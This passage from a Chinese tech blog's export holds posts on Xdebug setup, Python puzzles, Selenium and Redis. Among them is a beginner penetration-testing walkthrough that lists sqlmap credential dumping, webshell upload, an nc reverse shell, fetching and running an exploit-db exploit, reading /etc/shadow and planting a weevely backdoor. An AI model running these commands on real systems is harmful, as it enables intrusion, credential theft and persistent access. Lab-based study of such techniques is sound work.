                > ssl那个文件里面所有的443改成8001<br>phpmyadmin那个里面有个password改成自己数据库的密码<br>第二个有点麻烦，待会说</p>
</li>
<li><p>下载xdebug<br>首先打开apache<br>然后输入localhost&#x2F;dashboard&#x2F;phpinfo.php<br>进入网址后右键viewpagesource，反正就是查看源码<br>然后ctrl a 全选后复制一波<br>找到这个地方粘上<br><a class="link"   href="https://xdebug.org/wizard.php" >xdebug自定义<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>然后analyze一下下载对应的xdebug.dll<br>放到xmapp下的php下的ext最好重命名一下<br>为xdebug.dll<br>以及对应着设置下前面提到的第二个文件php.ini<br>找到最后添加<strong>类似</strong>如下配置<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420170303062?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="php.ini"
                ><br>按官方说明来<br>最后一行没有引号<br>如何知道自己安装成功了？<br>检查如下网址<br><a class="link"   href="http://localhost/dashboard/phpinfo.php" >http://localhost/dashboard/phpinfo.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>如存在xdebug下图，即可 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170422111256729?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="这里写图片描述"
                ></p>
</li>
<li><p>科学一下<br>从chrome商店下个 xdebug helper<br>然后配置一下这个插件的idekey为PhpStorm</p>
</li>
<li><p>最后就是配置phpstorm了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420171009133?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="phpstorm"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420170953699?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="phpstorm"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420171143357?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="DBGP proxy"
                ></p>
</li>
<li><p>终于最后一步了<br>新建项目于xampp&#x2F;htdc&#x2F;你的项目名<br>然后<br>添加一下服务器打开debug就可以跑了（apache别关） <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420171518297?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="webapplication"
                ></p>
<p>starturl填项目名，然后打开两个地方，一个是chrome那个debug插件<br>设置为debug形式<br>另一个是phpstorm里那个看起来有点像电话然后一直红色的禁止符号让人很不顺眼那个<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420171847254?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="phpstorm断点调试"
                ></p>
</li>
</ol>
<hr>
<p>至此完结，为这个世界献上美好的祝福</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>phpstorm</tag>
        <tag>xampp</tag>
        <tag>xdebug</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透菜鸟概览</title>
    <url>/2017/02/16/ptentest-tutorial/</url>
    <content><![CDATA[<p><a class="link"   href="http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652842156&idx=1&sn=c489f1b49c214595ece5d2a8b3e40889&chksm=bd5954618a2edd7702748b7d06a240b5f3fc86bb4c21f58de69eed30feeb2cb09394cf75bce2&mpshare=1&scene=23&srcid=0215XJl3UqKIKFad5orXfr3B#rd" >微信原文<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ol>
<li><p>ping 根据 hostname 获取 IP</p>
</li>
<li><p>寻找同一服务器上的其它网站，使用sameip.org.</p>
</li>
<li><p>开始采集信息</p>
<pre><code>1. DNS records (A, NS, TXT, MX and SOA)
2. Web Server Type (Apache, IIS, Tomcat)
3. Registrar (the company that owns your domain)
4. Your name, address, email and phone
5. Scripts that your site uses (php, asp, asp.net, jsp, cfm)
6. Your server OS (Unix,Linux,Windows,Solaris)
7. Your server open ports to internet (80, 443, 21, etc.)
</code></pre>
<ul>
<li>whois 查询DNS记录，web Server &amp; version</li>
<li>whatWeb 获取 网站服务器操作系统类型，服务器版本，整站程序</li>
<li>nmap使用  <ul>
<li>查看服务器上运行的服务 namp -sV hostname</li>
<li>查看操作系统版本 namp -O hostname</li>
</ul>
</li>
</ul>
</li>
<li><p>扫描漏洞<br><code>Sql injection， Blind sql injection，LFI，RFI，XSS，CSRF 等等</code></p>
<hr>
<p>使用 Nikto</p>
<pre><code>root@bt:/pentest/web/nikto# perl nikto.pl -h hack-test.com
</code></pre>
<p>或w3af</p>
<pre><code>root@bt:/pentest/web/w3af# ./w3af_gui
</code></pre>
<p>输入要检测的网站地址,选择完整的安全审计选项</p>
<hr>
</li>
<li><p>漏洞利用<br>假设存在sql注入</p>
<ul>
<li>注入检查<br><code>sqlmap.py –u url</code></li>
<li>猜数据库名<br><code>sqlmap.py –u url --dbs</code></li>
<li>猜表名<br><code>sqlmap.py -u url -D dbname --tables</code></li>
<li>猜字段名<br><code>sqlmap.py -u url -D dbName -T tName --columns</code></li>
<li>猜解字段值(假设猜解user，pwd)<br><code>sqlmap.py -u url -D dbName -T tName --columns -C user,pwd –dump</code></li>
</ul>
</li>
<li><p>密码破解<br>推荐hashes破解网站<br><a class="link"   href="http://www.onlinehashcrack.com/free-hash-reverse.php" >http://www.onlinehashcrack.com/free-hash-reverse.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>上传webshell，方便运行linux命令<br>上传方式推荐<code>插件编辑</code>（整站程序）</p>
</li>
<li><p>上升权限<br>(1) 用NC来反弹一个shell,首先 监听 5555 端口<br><code>nc -lvvp 5555</code><br>(2) 用上传的webshell 反向连接我方<br>输入我方 IP 和 5555<br>(3) 测试命令及结果</p>
<pre><code>&gt;&gt; id
（用来显示用户的id和组）    
uid=48(apache) gid=489(apache) groups=489(apache)

&gt;&gt; pwd
（显示服务器上当前的路径）    
/var/www/html/Hackademic_RTB1/wp-content/plugins

&gt;&gt; uname -a
（显示内核版本信息）   
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux 
</code></pre>
<p>(4)exploit-db.com 查询漏洞<br>下载<br><code>wget http://www.exploit-db.com/exploits/15285 -o roro.c</code><br>编译：根据语言选择编译器<br><code>gcc roro.c –o roro</code><br>(5).&#x2F;roro 执行<br>(6) id查看权限</p>
</li>
<li><p><code>cat /etc/shadow</code><br>此命令查看密码</p>
<ul>
<li>john the ripper工具用来破解或重置密码</li>
<li>开后门</li>
</ul>
</li>
<li><p>开后门<br>*   上传<br>   <code>root@bt:/pentest/backdoors/web/weevely# ./main.py -</code><br>*   使用<br><br>   root@bt:&#x2F;pentest&#x2F;backdoors&#x2F;web&#x2F;weevely# .&#x2F;main.py -t -u <a class="link"   href="http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php" >http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> -p koko</p>
</li>
</ol>
<pre><code>*   测试命令 `dir， pwd， id， uname -a`
</code></pre>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>apache</tag>
        <tag>security</tag>
        <tag>web server</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Funny</title>
    <url>/2016/11/27/pyfun/</url>
    <content><![CDATA[<pre><code># coding:utf-8
import requests
import re

def getChanllenge(p):
    return requests.get(&quot;http://www.pythonchallenge.com/pc/&quot;+p).text
banner = getChanllenge(&quot;def/banner.p&quot;)

import pickle
data = pickle.loads(banner)
#print data
&gt;&gt;&gt; data
[[(&#39; &#39;, 95)],
 [(&#39; &#39;, 14), (&#39;#&#39;, 5), (&#39; &#39;, 70), (&#39;#&#39;, 5), (&#39; &#39;, 1)],
 [(&#39; &#39;, 15), (&#39;#&#39;, 4), (&#39; &#39;, 71), (&#39;#&#39;, 4), (&#39; &#39;, 1)],
 ...]

print &#39;\n&#39;.join([&#39;&#39;.join([p[0]*p[1] for p in row]) for row in data]) 
</code></pre>
<p>关于pickle的学习，摘自<a class="link"   href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/00138683221577998e407bb309542d9b6a68d9276bc3dbe000" >廖雪峰官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<blockquote>
<p>我们把变量从内存中变成可存储或传输的过程称之为序列化，在Python中叫pickling，在其他语言中也被称之为serialization，marshalling，flattening等等，都是一个意思。<br>1. 序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。<br>2. 反过来，把变量内容从序列化的对象重新读到内存里称之为反序列化，即unpickling</p>
</blockquote>
<p>python 提供pickle.dump将对象序列化str，然后就可以写入文件。<br>当我们要把对象从磁盘读到内存时，可以先把内容读到一个str，然后用pickle.loads()方法反序列化出对象，也可以直接用pickle.load()方法从一个file-like Object中直接反序列化出对象。我们打开另一个Python命令行来反序列化刚才保存的对象：</p>
<pre><code>d = dict(name=&#39;Bob&#39;, age=20, score=88)
f = open(&#39;dump.txt&#39;, &#39;wb&#39;)
pickle.dump(d, f)
f.close()
</code></pre>
<p>进阶json：<br>如果我们要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如XML，但更好的方法是序列化为JSON，因为JSON表示出来就是一个字符串，可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。 JSON表示的对象就是标准的JavaScript语言的对象，JSON和Python内置的数据类型对应如下：</p>
<pre><code>JSON类型    Python类型
&#123;&#125;          dict
[]          list
&quot;string&quot;    &#39;str&#39;或u&#39;unicode&#39;
1234.56     int或float
true/false  True/False
null        None

import json

class Student(object):
    def __init__(self, name, age, score):
        self.name = name
        self.age = age
        self.score = score

s = Student(&#39;Bob&#39;, 20, 88)
print(json.dumps(s))
</code></pre>
<p>以上代码运行报错<code>TypeError</code> 错误的原因是Student对象不是一个可序列化为JSON的对象。 如果连class的实例对象都无法序列化为JSON，这肯定不合理！ 别急，我们仔细看看dumps()方法的参数列表，可以发现，除了第一个必须的obj参数外，dumps()方法还提供了一大堆的可选参数： <a class="link"   href="https://docs.python.org/2/library/json.html#json.dumps" >https://docs.python.org/2/library/json.html#json.dumps<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这些可选参数就是让我们来定制JSON序列化。前面的代码之所以无法把Student类实例序列化为JSON，是因为默认情况下，dumps()方法不知道如何将Student实例变为一个JSON的{}对象。 可选参数default就是把任意一个对象变成一个可序列为JSON的对象，我们只需要为Student专门写一个转换函数，再把函数传进去即可：</p>
<pre><code> def student2dict(std):
    return &#123;
        &#39;name&#39;: std.name,
        &#39;age&#39;: std.age,
        &#39;score&#39;: std.score
    &#125;

print(json.dumps(s, default=student2dict))
</code></pre>
<p>偷个懒，把任意class的实例变为dict：</p>
<pre><code>print(json.dumps(s, default=lambda obj: obj.__dict__))
</code></pre>
<p>因为通常class的实例都有一个<code>__dict__</code>属性，它就是一个<code>dict</code>，用来存储实例变量。也有少数例外，比如定义了<code>__slots__</code>的<code>class</code>。 同样的道理，如果我们要把<code>JSON</code>反序列化为一个Student对象实例，<code>loads()方法首先转换出一个</code>dict<code>对象，然后，我们传入的</code>object_hook&#96;函数负责把dict转换为Student实例：</p>
<pre><code>def dict2student(d):
    return Student(d[&#39;name&#39;], d[&#39;age&#39;], d[&#39;score&#39;])

json_str = &#39;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#39;
print(json.loads(json_str, object_hook=dict2student))
</code></pre>
<p>打印出的是反序列化的Student实例对象。</p>
<pre><code>&lt;__main__.Student object at 0x10cd3c190&gt;
</code></pre>
<blockquote>
<p>Python语言特定的序列化模块是pickle，但如果要把序列化搞得更通用、更符合Web标准，就可以使用json模块。 json模块的dumps()和loads()函数是定义得非常好的接口的典范。<br>但是，当默认的序列化或反序列机制不满足我们的要求时，我们又可以传入更多的参数来定制序列化或反序列化的规则，既做到了接口简单易用，又做到了充分的扩展性和灵活性。</p>
</blockquote>
<h3 id="python-解方程"><a href="#python-解方程" class="headerlink" title="python 解方程"></a>python 解方程</h3><p>首先补个没用的小知识：</p>
<blockquote>
<blockquote>
<p>python 字典（dict）的特点就是无序的，按照键（key）来提取相应值（value），如果我们需要字典按值排序的话，那可以用下面的方法来进行：</p>
</blockquote>
<p>1 下面的是按照value的值从大到小的顺序来排序。</p>
</blockquote>
<pre><code>&gt; dic = &#123;&#39;a&#39;:31, &#39;bc&#39;:5, &#39;c&#39;:3, &#39;asd&#39;:4, &#39;aa&#39;:74, &#39;d&#39;:0&#125; 

&gt; dict= sorted(dic.iteritems(), key=lambda d:d[1], reverse=True)

&gt; print dict
</code></pre>
<blockquote>
<p>输出的结果： [(‘aa’, 74), (‘a’, 31), (‘bc’, 5), (‘asd’, 4), (‘c’, 3), (‘d’,<br>0)] 下面我们分解下代码 print dic.iteritems() 得到[(键，值)]的列表。<br>然后用sorted方法，通过key这个参数，指定排序是按照value，也就是第一个元素d[1的值来排序。reverse &#x3D;<br>True表示是需要翻转的，默认是从小到大，翻转的话，那就是从大到小。 2 对字典按键（key）排序： dic &#x3D; {‘a’:31, ‘bc’:5, ‘c’:3, ‘asd’:4, ‘aa’:74, ‘d’:0}<br>dict&#x3D; sorted(dic.iteritems(), key&#x3D;lambda d:d[0]) d[0]表示字典的键 print dict</p>
</blockquote>
<hr>
<h3 id="开始正文"><a href="#开始正文" class="headerlink" title="开始正文"></a><strong>开始正文</strong></h3><p>这题贼骚，看一下，分析题意： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20161108230522489"
                      alt="这里写图片描述"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20161108230539598"
                      alt="这里写图片描述"
                > 看出来了<br>1. a[i]对应有47 - i个<br>2. 所以直接猜a[0]是不是有一个式子直接是答案<br>3. 果然他妈的是<br>4. 重点这题求flag，不用说就是0~255的转字符 题意都解出来了，用个eval带入就行了 代码如下：</p>
<pre><code>U2FsdGVkX19KtIGRMjhv79O2ksMma1ncjBHLltmYL4imgdCwkGFLnvvXeKg%2FDJiqT37C8XxTl6SmNsi722e1G2Ie614lEWEk5v9HyMN0%2BIPSGMDsSpXC%2BAsWJXJeZ%2Boq1xcMN3gXBfF3JcIgivaCRuBg96%2B7NtnglfouIvyPqw8MAj6lDJnanh80cFEJu%2BRaeGMFHnJkEy3JY1tIg%2BZ%2Fe0I474cA%2FT1tenhgntfhd8NUNTIV5e%2FXCmFQ4%2FI%2BBbL8BIQPPbpOxSDA%2BXU%2BhUXm0%2FdaPKWG6Pla6mVxgGUexJC78kuUlK%2BT2hd5xdslb0oEM%2FxIsgVi9YQ%3D
</code></pre>
<p>上边的网址简单加了几次小密<br>建议还是自己搞，有了思路还是比较简单的</p>
<h3 id="caseder-code"><a href="#caseder-code" class="headerlink" title="caseder code"></a>caseder code</h3><p>python好叼</p>
<pre><code>#!/usr/bin/python
# -*- coding: UTF-8 -*-

from string import maketrans   # 必须调用 maketrans 函数。

intab = &quot;aeiou&quot;
outtab = &quot;12345&quot;
trantab = maketrans(intab, outtab)

str = &quot;this is string example....wow!!!&quot;;
print str.translate(trantab);
</code></pre>
<p>string的maketrans用来创建翻译表<br>intab待翻译源，outtab翻译结果<br>import string<br>string.ascii_uppercase是’ABCDEFGHIJKLMNOPQRSTUVWXYZ’<br>利用切片可以做凯撒密码 其实就是把字母前面的部分截到第一个要兑换的部分<br>再把截取的这一部分粘到后面去，比如说</p>
<blockquote>
<p>k-m o-q e-g<br>即每个字母移两位那么就是<br>abcdefghijklmnopqrstuvwxyz<br>cdefghijklmnopqrstuvwxyzab<br>string.ascii_lowercase[2:]即cdefghijklmnopqrstuvwxyz<br>string.ascii_lowercase[:2]即ab</p>
</blockquote>
<p>所以可解</p>
<pre><code>#coding:utf-8
import string      
def caesar_shift(s):  
    table = string.maketrans(string.ascii_lowercase, string.ascii_lowercase[2:] + string.ascii_lowercase[:2])         
    print s.translate(table)  
caesar_shift(&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#39;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj.&quot;)
</code></pre>
<p>加个循环解26位，再把大小写拼一起，搞定</p>
<pre><code>#coding:utf-8
import string      
def caesar_shift(s):
    for i in range(26) :
        table = string.maketrans(string.ascii_lowercase + string.ascii_uppercase, string.ascii_lowercase[i:] + string.ascii_lowercase[:i] + string.ascii_uppercase[i:] + string.ascii_uppercase[:i])
        print s.translate(table)  
caesar_shift(&quot;AAAAedjlak...dadazzzc..fghi&quot;)
</code></pre>
<hr>
<p><strong>样例结果</strong></p>
<pre><code>AAAAedjlak...dadazzzc..fghi
BBBBfekmbl...ebebaaad..ghij
CCCCgflncm...fcfcbbbe..hijk
DDDDhgmodn...gdgdcccf..ijkl
EEEEihnpeo...hehedddg..jklm
FFFFjioqfp...ififeeeh..klmn
GGGGkjprgq...jgjgfffi..lmno
HHHHlkqshr...khkhgggj..mnop
IIIImlrtis...lilihhhk..nopq
JJJJnmsujt...mjmjiiil..opqr
KKKKontvku...nknkjjjm..pqrs
LLLLpouwlv...ololkkkn..qrst
MMMMqpvxmw...pmpmlllo..rstu
NNNNrqwynx...qnqnmmmp..stuv
OOOOsrxzoy...roronnnq..tuvw
PPPPtsyapz...spspooor..uvwx
QQQQutzbqa...tqtqppps..vwxy
RRRRvuacrb...ururqqqt..wxyz
SSSSwvbdsc...vsvsrrru..xyza
TTTTxwcetd...wtwtsssv..yzab
UUUUyxdfue...xuxutttw..zabc
VVVVzyegvf...yvyvuuux..abcd
WWWWazfhwg...zwzwvvvy..bcde
XXXXbagixh...axaxwwwz..cdef
YYYYcbhjyi...bybyxxxa..defg
ZZZZdcikzj...czczyyyb..efgh
</code></pre>
<h2 id="QQ-空间登陆"><a href="#QQ-空间登陆" class="headerlink" title="QQ 空间登陆"></a>QQ 空间登陆</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.maximize_window()</span><br><span class="line"></span><br><span class="line">driver.get(<span class="string">&quot;http://i.qq.com/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;login_div&#x27;</span>)</span><br><span class="line">    a = <span class="literal">True</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    a = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a == <span class="literal">True</span>:</span><br><span class="line">    driver.switch_to.frame(<span class="string">&#x27;login_frame&#x27;</span>)</span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;switcher_plogin&#x27;</span>).click()</span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;u&#x27;</span>).clear()<span class="comment">#选择用户名框</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;u&#x27;</span>).send_keys(<span class="string">&#x27;QQ&#x27;</span>)</span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;p&#x27;</span>).clear()</span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;p&#x27;</span>).send_keys(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;login_button&#x27;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(driver.page_source)</span><br><span class="line"></span><br><span class="line">driver.close()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170402195214612?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="这里写图片描述"
                > 一开始直接找登陆的账号密码Element<br>但是却报错显示未查找到该Element<br>于是打印了下 page_source，查了下view-page<br>发现的确未有改元素</p>
<p>拜读了大佬的博客才知道这里使用了iframe加载了登陆框<br>然后就是定位该框，点击账号密码登录输入，点击登陆即可</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>pickle</tag>
        <tag>python</tag>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>(转) Redis 基础知识笔记记录</title>
    <url>/2020/07/19/redis/</url>
    <content><![CDATA[<p>文章笔记参考链接来自作者 敖丙 </p>
<p>开源项目：<a class="link"   href="https://github.com/AobingJava/JavaFamily" >https://github.com/AobingJava/JavaFamily<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>以及 Redis 设计与实现</p>
<p>以及 钱大的 Redis 深度历险</p>
<h2 id="Redis-常见应用"><a href="#Redis-常见应用" class="headerlink" title="Redis 常见应用"></a>Redis 常见应用</h2><ul>
<li>记录帖子的点赞数、评论数和点击数 (hash)。</li>
<li>记录用户的帖子 ID 列表 (排序)，便于快速显示用户的帖子列表 (zset)。</li>
<li>记录帖子的标题、摘要、作者和封面信息，用于列表页展示 (hash)。</li>
<li>记录帖子的点赞用户 ID 列表，评论 ID 列表，用于显示和去重计数 (zset)。</li>
<li>缓存近期热帖内容 (帖子内容空间占用比较大)，减少数据库压力 (hash)。</li>
<li>记录帖子的相关文章 ID，根据内容推荐相关帖子 (list)。</li>
<li>如果帖子 ID 是整数自增的，可以使用 Redis 来分配帖子 ID(计数器)。</li>
<li>收藏集和帖子之间的关系 (zset)。</li>
<li>记录热榜帖子 ID 列表，总热榜和分类热榜 (zset)。</li>
<li>缓存用户行为历史，进行恶意行为过滤 (zset,hash)。</li>
<li>数据推送去重Bloom filter pv，uv统计</li>
</ul>
<h3 id="小菜"><a href="#小菜" class="headerlink" title="小菜"></a>小菜</h3><h4 id="delay-queue"><a href="#delay-queue" class="headerlink" title="delay queue"></a>delay queue</h4><p>Redis 可以做单消费组的消息对列，但没有 ack 保证的原因意味着可靠性也没有保证。</p>
<blockquote>
<p>redis 队列可能出现空队列时 pop 的空轮询，这种情况下 一般采用sleep(1000) 让其他线程获取可执行的机会</p>
</blockquote>
<h4 id="bitmap"><a href="#bitmap" class="headerlink" title="bitmap"></a>bitmap</h4><p>签到，用户日活 </p>
<p>可以设 key 为前缀:用户id:年月， <code>setbit sign:123:1909 0 1</code> 代表用户 123 19年9月 第 1（就是0的时候）天签到 bitcount来统计签到天数</p>
<h3 id="HyperLogLog"><a href="#HyperLogLog" class="headerlink" title="HyperLogLog"></a>HyperLogLog</h3><p>Page visit，简单的 incrby 就可<br>User visit 就无法简单处理，如果每个页面一个 set 就很爆炸<br>HyperLoglog的 pfadd 用法和 set 集合的 sadd 是一样的，来一个用户 ID，就将用户 ID 塞进去就是，pfcount 和 scard 用法是一样的，直接获取计数值。</p>
<h3 id="bloom-过滤器"><a href="#bloom-过滤器" class="headerlink" title="bloom 过滤器"></a>bloom 过滤器</h3><p>bf.add bf.exists 比如新闻推荐，url爬取等的去重操作</p>
<p>布隆过滤器的initial_size估计的过大，会浪费存储空间，估计的过小，就会影响准确率，用户在使用之前一定要尽可能地精确估计好元素数量，还需要加上一定的冗余空间以避免实际元素可能会意外高出估计值很多。</p>
<p>  布隆过滤器的error_rate越小，需要的存储空间就越大，对于不需要过于精确的场合，error_rate设置稍大一点也无伤大雅。比如在新闻去重上而言，误判率高一点只会让小部分文章不能让合适的人看到，文章的整体阅读量不会因为这点误判率就带来巨大的改变。</p>
<p>大致说下原理：</p>
<p>初始化 n 个元素长度的的数组，提供 k 个hash 函数，从数组的角度来看，当有元素hash对数组的某个索引命中时，那么这个地方就置为1，注意的是数组的位置只有第一次设置为1后后面的设置就不再起效</p>
<p>这样当我们对 给定值应用了 k 次 hash后发现全部落在数组值为 1 的地方，那么我们就判定这个元素在数组中是存在的。</p>
<p>tips: 可以看出来这东西并不绝对，有一定的误差，至于怎么把这个误差减到最少，需要了解下相关的推论。</p>
<h3 id="Redis-数据结构"><a href="#Redis-数据结构" class="headerlink" title="Redis 数据结构"></a>Redis 数据结构</h3><p>基本五个：</p>
<p><code>String、Hash、List、Set、SortedSet</code></p>
<p>然后还有：<code>HyperLogLog、Geo、Pub/Sub</code></p>
<p>以及 Redis Module，比如：<code>BloomFilter，RedisSearch，Redis-ML</code></p>
<ol>
<li><p>String: 常见缓存，共享session等，强烈不建议复杂结构做 jsonToString 之类的操作。</p>
</li>
<li><p>hash， map一般不常用，难见场景</p>
</li>
<li><p>list：常用来存储列表之类的数据，比如lrange 命令，读取某个闭区间内的元素，可以基于 List 实现下拉那种分页查询，再就是阻塞队列了。</p>
</li>
<li><p>set，一般用来运算并交差集之类的，比如取两个人的共同好友之类的</p>
</li>
<li><p>zset：根据 score 作为权重的排序</p>
</li>
</ol>
<hr>
<p>String： 类似一个ArrayList&lt;Byte|Char&gt;, 加了长度限制字段，目的是尽可能高效且不浪费利用空间并且防范缓冲区溢出等问题。</p>
<hr>
<p>list：类似 linked list，双向链表, 可实现队列，栈效果</p>
<hr>
<p>hash：类似 hashMap 仅通过数组加链表解决hash冲突，实际上字典结构的内部包含两个 hashtable，通常情况下只有一个 hashtable 是有值的，但是在字典扩容缩容时，需要分配新的 hashtable，然后进行 渐进式搬迁 。</p>
<p>渐进式 rehash：就是持有两个hashtable，查地时候去两个里面查，这样避免一次性大扩容单线程的 redis 顶不住。</p>
<p>扩容条件：正常情况下，当 hash表中 元素的个数等于第一维数组的长度时，就会开始扩容，扩容的新数组是 原数组大小的 2倍。不过如果 Redis正在做 bgsave(持久化命令)，为了减少内存也得过多分离，Redis尽量不去扩容，但是如果 hash 表非常满了，达到了第一维数组长度的 5 倍了，这个时候就会 强制扩容。<br>当 hash 表因为元素逐渐被删除变得越来越稀疏时，Redis 会对 hash 表进行缩容来减少 hash 表的第一维数组空间占用。所用的条件是 元素个数低于数组长度的 10%，缩容不会考虑 Redis 是否在做 bgsave。</p>
<hr>
<p>集合 set：Redis 的集合相当于 Java 语言中的 HashSet，它内部的键值对是无序、唯一的。它的内部实现相当于一个特殊的字典，字典中所有的value 都是一个值 NULL。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">intset</span>&#123;</span></span><br><span class="line">     <span class="comment">//编码方式</span></span><br><span class="line">     <span class="type">uint32_t</span> encoding;</span><br><span class="line">     <span class="comment">//集合包含的元素数量</span></span><br><span class="line">     <span class="type">uint32_t</span> length;</span><br><span class="line">     <span class="comment">//保存元素的数组</span></span><br><span class="line">     <span class="type">int8_t</span> contents[];</span><br><span class="line">&#125;intset;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>intset 编码的集合对象使用整数集合作为底层实现，集合对象包含的所有元素都被保存在整数集合中。因此使用时需同时满足元素皆是整数且数量不超过max-intset-entries</p>
</li>
<li><p>hashtable 编码的集合对象使用 字典作为底层实现，字典的每个键都是一个字符串对象，这里的每个字符串对象就是一个集合中的元素，而字典的值则全部设置为 null。这里可以类比Java集合中HashSet<br> 集合的实现，HashSet 集合是由 HashMap 来实现的，集合中的元素就是 HashMap 的key，而 HashMap 的值都设为 null。</p>
</li>
</ol>
<hr>
